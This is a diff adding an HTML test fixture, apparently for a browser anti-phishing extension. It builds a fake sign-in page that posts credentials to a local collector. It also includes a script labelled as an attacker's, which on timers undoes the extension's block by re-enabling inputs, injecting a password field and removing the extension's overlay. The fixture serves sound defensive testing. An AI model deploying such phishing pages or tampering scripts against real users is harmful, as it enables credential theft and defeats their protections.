@@ -1,0 +1,33 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <title>Account sign in</title>
+  </head>
+  <body>
+    <h1>Sign in</h1>
+    <form action="http://127.0.0.1:4321/collect" method="post">
+      <input type="text" name="user" autocomplete="username" />
+      <input type="password" name="pw" autocomplete="current-password" />
+      <button type="submit">Sign in</button>
+    </form>
+    <script>
+      // Attacker script: tries to defeat the block after the extension applies it.
+      const tamper = () => {
+        document.body.removeAttribute('inert');
+        for (const input of document.querySelectorAll('input')) {
+          input.readOnly = false;
+          input.removeAttribute('autocomplete');
+        }
+        const injected = document.createElement('input');
+        injected.type = 'password';
+        injected.name = 'pw2';
+        injected.id = 'injected-password';
+        document.body.append(injected);
+        document.querySelector('sentinel-root')?.remove();
+      };
+      setTimeout(tamper, 700);
+      setTimeout(tamper, 1500);
+    </script>
+  </body>
+</html>
